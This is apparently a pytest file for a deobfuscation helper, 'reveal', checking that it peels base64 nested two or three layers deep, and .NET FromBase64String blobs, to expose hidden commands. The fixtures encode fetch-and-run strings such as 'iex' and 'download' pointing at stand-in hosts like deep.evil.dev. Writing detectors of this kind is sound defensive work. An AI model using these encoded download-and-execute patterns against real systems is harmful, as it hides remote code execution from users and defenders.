"""Item 13: nested decoding. base64-of-base64 (and deeper) is peeled recursively to the real payload;
.NET FromBase64String blobs are caught by the generic base64 scan; plain text is still untouched."""

import base64

from alibi.decode import reveal


def test_nested_base64():
    inner = base64.b64encode(b"download http://nested.evil.com/x").decode()
    outer = base64.b64encode(inner.encode()).decode()
    assert "nested.evil.com" in reveal(f"run {outer}")


def test_triple_nested_base64():
    b = base64.b64encode(b"iex http://deep.evil.dev/p").decode()
    b = base64.b64encode(b.encode()).decode()
    b = base64.b64encode(b.encode()).decode()
    assert "deep.evil.dev" in reveal(f"x {b}")


def test_dotnet_frombase64_decoded():
    b = base64.b64encode(b"iex http://dotnet.evil.io/p").decode()
    assert "dotnet.evil.io" in reveal(f'[Convert]::FromBase64String("{b}")')


def test_plain_text_still_unchanged():
    assert reveal("nothing to decode here really") == "nothing to decode here really"
